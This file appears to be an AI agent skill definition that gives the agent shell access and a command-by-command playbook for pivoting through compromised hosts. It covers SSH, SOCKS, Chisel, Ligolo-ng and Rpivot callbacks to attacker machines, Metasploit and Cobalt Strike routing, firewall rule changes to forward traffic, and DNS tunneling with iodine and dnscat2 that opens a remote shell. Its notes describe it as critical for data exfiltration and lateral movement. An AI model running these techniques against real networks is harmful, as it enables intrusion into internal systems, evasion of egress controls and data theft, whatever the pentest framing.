---
name: network-pivoting
description: Advanced network pivoting and tunneling techniques for accessing internal networks, including SSH tunneling, SOCKS proxies, and multi-hop pivoting
allowed-tools: Bash, Read, Write, Grep
---

# Network Pivoting Skill

## Purpose
Provides comprehensive network pivoting techniques for accessing internal networks through compromised hosts, including SSH tunneling, SOCKS proxies, port forwarding, and advanced multi-hop pivoting strategies.

## Network Discovery

### Identify Network Interfaces
```bash
# Linux
ifconfig -a
ip addr show
ip route show
cat /proc/net/route
cat /proc/net/arp

# Windows
ipconfig /all
route print
arp -a
netsh interface show interface

# Check for multiple NICs
ip link show | grep -E "^[0-9]+:"
Get-NetAdapter | Select Name, Status, MacAddress, LinkSpeed
```

### Discover Internal Networks
```bash
# Scan local subnets
for i in {1..254}; do ping -c 1 10.10.10.$i | grep "bytes from" & done
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from" & done

# ARP scan
arp-scan --local
arp-scan 192.168.1.0/24

# Using nmap through pivot
proxychains nmap -sT -Pn 192.168.1.0/24

# Check routing table for networks
netstat -rn
ip route | grep -v "default"
```

### Identify Pivot Points
```bash
# Check listening services
netstat -tulpn
ss -tulpn
netstat -an | grep LISTEN

# Windows
netstat -an | findstr LISTENING
Get-NetTCPConnection -State Listen

# Identify dual-homed hosts
# Multiple network interfaces = good pivot point
```

## SSH Tunneling

### Local Port Forwarding
```bash
# Forward local port to remote host through SSH
ssh -L local_port:target_host:target_port user@pivot_host
ssh -L 8080:192.168.1.100:80 user@10.10.10.10

# Example: Access internal web server
ssh -L 8080:internal-web:80 user@jumpbox
# Browse to http://localhost:8080

# Multiple forwards
ssh -L 3306:db-server:3306 -L 8080:web-server:80 user@pivot

# Background tunnel
ssh -fN -L 8080:192.168.1.100:80 user@10.10.10.10
```

### Remote Port Forwarding
```bash
# Forward remote port to local host
ssh -R remote_port:target_host:target_port user@pivot_host
ssh -R 4444:127.0.0.1:4444 user@10.10.10.10

# Example: Expose internal service
ssh -R 8080:localhost:80 user@external-server
# Service now accessible at external-server:8080

# Bypass firewall egress restrictions
ssh -R 4444:localhost:4444 user@attacker-server
```

### Dynamic Port Forwarding (SOCKS)
```bash
# Create SOCKS proxy
ssh -D 9050 user@pivot_host
ssh -fND 9050 user@10.10.10.10

# Use with proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://internal-server

# Use with browser
# Configure browser SOCKS proxy: 127.0.0.1:9050

# Multiple hops
ssh -J user@host1,user@host2 -D 9050 user@final_host
```

### SSH Config for Pivoting
```bash
# ~/.ssh/config
Host pivot1
    HostName 10.10.10.10
    User root
    IdentityFile ~/.ssh/id_rsa

Host internal-*.i
    ProxyJump pivot1
    User admin
    HostName %h

# Usage: ssh internal-web.i
```

## SOCKS Proxies

### Setting up SOCKS Proxies
```bash
# Using SSH (already covered)
ssh -D 9050 user@pivot

# Using Chisel
# Server (on pivot)
./chisel server -p 8080 --reverse

# Client (on attacker)
./chisel client pivot:8080 R:socks

# Using SSHuttle (transparent proxy)
sshuttle -r user@pivot 192.168.1.0/24 10.10.10.0/24
sshuttle -r user@pivot 0.0.0.0/0 -x attacker_ip

# Using Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
run
# or
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
run
```

### ProxyChains Configuration
```bash
# Edit /etc/proxychains4.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Single proxy
socks4 127.0.0.1 9050

# Chain multiple proxies
socks4 127.0.0.1 9050
socks4 127.0.0.1 9051
http 127.0.0.1 8080

# Usage
proxychains curl http://internal.site
proxychains nmap -sT -Pn target
proxychains firefox
```

## Port Forwarding Tools

### Socat
```bash
# Simple port forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Forward through SOCKS
socat TCP-LISTEN:8080,fork SOCKS4:127.0.0.1:192.168.1.100:80,socksport=9050

# UDP forwarding
socat UDP-LISTEN:53,fork UDP:192.168.1.1:53

# Encrypted tunnel
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 365 -out cert.crt
cat cert.key cert.crt > cert.pem

# Server
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork TCP:192.168.1.100:22

# Client
socat TCP-LISTEN:2222,fork OPENSSL:pivot:4444,verify=0
```

### Netcat Relays
```bash
# Simple relay
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc 192.168.1.100 80 1>backpipe

# Persistent relay
while true; do mkfifo backpipe; nc -l -p 8080 0<backpipe | nc 192.168.1.100 80 1>backpipe; rm backpipe; done

# Using ncat (supports encryption)
ncat -l 8080 --sh-exec "ncat 192.168.1.100 80"
```

### Rinetd
```bash
# Install rinetd
apt-get install rinetd

# Configure /etc/rinetd.conf
# bindaddress bindport connectaddress connectport
0.0.0.0 8080 192.168.1.100 80
0.0.0.0 3306 192.168.1.50 3306

# Start
rinetd -c /etc/rinetd.conf
```

## Advanced Pivoting Tools

### Chisel
```bash
# Server mode (on pivot)
./chisel server -p 8080 --reverse --socks5

# Client mode (on attacker)
# SOCKS proxy
./chisel client pivot:8080 R:socks

# Port forward
./chisel client pivot:8080 R:8000:192.168.1.100:80

# Reverse port forward
./chisel client pivot:8080 L:3000:192.168.1.100:3000

# Multiple tunnels
./chisel client pivot:8080 \
  R:8001:192.168.1.100:80 \
  R:8002:192.168.1.101:80 \
  R:socks
```

### Ligolo-ng
```bash
# Proxy server (attacker machine)
./proxy -selfcert

# Agent (on pivot)
./agent -connect attacker:11601 -ignore-cert

# On proxy console
> session
> start
> add_route 192.168.1.0/24 1
> listener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80

# Access internal network directly
ip route add 192.168.1.0/24 dev ligolo
```

### Rpivot
```bash
# Server (attacker machine)
python server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client (on pivot)
python client.py --server-ip attacker_ip --server-port 9999

# Use SOCKS proxy at 127.0.0.1:9050
```

### Plink (Windows)
```cmd
# Port forward
plink.exe -ssh -L 8080:192.168.1.100:80 user@10.10.10.10

# Dynamic forward (SOCKS)
plink.exe -ssh -D 9050 user@10.10.10.10

# Remote forward
plink.exe -ssh -R 4444:127.0.0.1:4444 user@attacker

# Background mode
plink.exe -ssh -D 9050 -N -T user@10.10.10.10
```

## Multi-Hop Pivoting

### Chain SSH Tunnels
```bash
# Method 1: ProxyJump
ssh -J user@host1,user@host2 user@host3

# Method 2: ProxyCommand
ssh -o ProxyCommand="ssh user@host1 nc %h %p" user@host2

# Method 3: Nested tunnels
# First hop
ssh -L 2222:host2:22 user@host1
# Second hop (through first)
ssh -p 2222 -L 3333:host3:22 user@localhost
# Third hop
ssh -p 3333 user@localhost

# Create SOCKS through multiple hops
ssh -J user@host1 -D 9050 user@host2
```

### Metasploit Pivoting
```ruby
# Add route through session
route add 192.168.1.0 255.255.255.0 1
route print

# SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run

# Port forward
portfwd add -l 8080 -p 80 -r 192.168.1.100
portfwd list

# AutoRoute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run
```

### Cobalt Strike Pivoting
```bash
# SOCKS proxy
socks 9050

# rportfwd
rportfwd 8080 192.168.1.100 80

# covertvpn
interfaces
ipconfig
```

## VPN Pivoting

### OpenVPN Through Pivot
```bash
# Forward VPN port
ssh -L 1194:vpn-server:1194 user@pivot

# Modify .ovpn config
remote 127.0.0.1 1194

# Connect
openvpn modified.ovpn
```

### SSTP VPN
```bash
# Setup SSTP server on Windows pivot
# Install RRAS role
# Configure SSTP

# Connect from Linux
sstpc --cert-warn vpn-server user password
```

### WireGuard Pivoting
```bash
# Setup WireGuard on pivot
wg genkey | tee privatekey | wg pubkey > publickey

# /etc/wireguard/wg0.conf
[Interface]
Address = 10.200.200.1/24
PrivateKey = <private_key>
ListenPort = 51820

[Peer]
PublicKey = <peer_public_key>
AllowedIPs = 10.200.200.2/32

# Start
wg-quick up wg0
```

## Network Address Translation

### iptables NAT
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# SNAT (masquerade)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT

# DNAT (port forwarding)
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.100:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### Windows netsh
```cmd
# Enable routing
netsh advfirewall firewall add rule name="Allow Pivot" dir=in action=allow protocol=any
netsh interface ipv4 set interface "Local Area Connection" forwarding=enabled

# Port proxy
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

## DNS Tunneling

### Iodine
```bash
# Server (external)
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client (internal)
iodine -f -P password tunnel.domain.com

# Now tunnel through DNS
ssh user@10.0.0.1
```

### DNSCat2
```bash
# Server
ruby dnscat2.rb --secret=password domain.com

# Client
./dnscat --secret=password domain.com

# In dnscat2 console
> windows
> session -i 1
> shell
```

## Troubleshooting Pivots

### Common Issues
```bash
# Check if forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward

# Check firewall rules
iptables -L -n -v
iptables -t nat -L -n -v

# Test connectivity
nc -zv target port
telnet target port

# Check routes
ip route show
route -n

# Monitor connections
netstat -antp | grep ESTABLISHED
ss -antp | grep ESTABLISHED

# Debug SSH tunnels
ssh -vvv -D 9050 user@pivot

# Test SOCKS proxy
curl --socks4 localhost:9050 http://internal.site
```

### Performance Optimization
```bash
# SSH compression
ssh -C -D 9050 user@pivot

# Increase SSH speed
ssh -o "Compression=yes" -o "CompressionLevel=9" -o "Ciphers=aes128-gcm@openssh.com" user@pivot

# Persistent connections
ssh -o "ServerAliveInterval=60" -o "ServerAliveCountMax=120" user@pivot

# Connection multiplexing
ssh -M -S /tmp/socket_%r@%h:%p -fN user@pivot
ssh -S /tmp/socket_%r@%h:%p user@pivot
```

## Best Practices

1. **Map the network thoroughly** before pivoting
2. **Use SOCKS proxies** for flexibility
3. **Document all tunnels** and pivots created
4. **Test connectivity** before relying on pivots
5. **Use encryption** when possible
6. **Monitor for detection** on pivot hosts
7. **Have backup pivots** in case of failure
8. **Clean up** tunnels after use

## Integration Notes

- Essential for accessing internal networks during pentests
- Works with all scanning/exploitation tools via proxychains
- Critical for data-exfiltration from isolated networks
- Enables lateral movement across network segments
- Required for multi-tier application testing